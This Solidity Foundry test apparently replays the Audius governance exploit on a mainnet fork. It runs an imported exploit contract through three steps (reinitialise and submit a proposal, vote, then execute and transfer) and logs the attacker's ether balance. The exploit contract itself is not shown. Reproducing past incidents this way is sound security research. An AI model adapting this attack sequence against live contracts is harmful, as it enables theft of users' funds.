// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "src/AudiusExploitWithProposal.sol";

contract AudiusExploitWithProposalTest is Test {
    address attackerAddress = address(11);

    function setUp() public {
        vm.createSelectFork("mainnet", 15201793);
    }

    function testAudiusExploitWithProposal() public {
        vm.startPrank(attackerAddress);

        AudiusExploitWithProposal exploiter = new AudiusExploitWithProposal();
        exploiter.initializeAudiusAndSubmitProposal();
        vm.roll(15201796);
        exploiter.vote();
        vm.roll(15201799);
        exploiter.evaluateAndTransfer();
        emit log_named_decimal_uint(
            "ether balance", attackerAddress.balance, 18
            );

        vm.stopPrank();
    }
}